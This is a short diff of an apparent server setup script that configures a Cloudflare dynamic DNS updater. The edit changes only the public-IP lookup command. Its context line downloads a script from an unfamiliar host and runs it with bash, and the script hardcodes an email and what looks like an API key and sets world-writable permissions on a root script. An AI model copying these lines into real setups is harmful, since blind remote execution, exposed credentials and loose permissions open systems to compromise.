@@ -25,7 +25,7 @@ wget sh.alhttdw.cn/d11.sh && bash d11.sh
 # dowload cloudflare-ddns
 sudo snap refresh && sudo snap install cloudflare-ddns
 # config cloudflare-ddns
-echo 'sudo snap run cloudflare-ddns -e dcmnmmmchkh@gmail.com -k 3b411374ee6b120fbfc87be4b80e930922034 -u az.rauxanh.site -4 $(curl -s ipinfo.io/ip) >> /root/ipcf.log' > /root/cloudflare-update.sh && sudo chmod 777 /root/cloudflare-update.sh
+echo 'sudo snap run cloudflare-ddns -e dcmnmmmchkh@gmail.com -k 3b411374ee6b120fbfc87be4b80e930922034 -u az.rauxanh.site -4 $(curl ifconfig.me) >> /root/ipcf.log' > /root/cloudflare-update.sh && sudo chmod 777 /root/cloudflare-update.sh
 
 
 
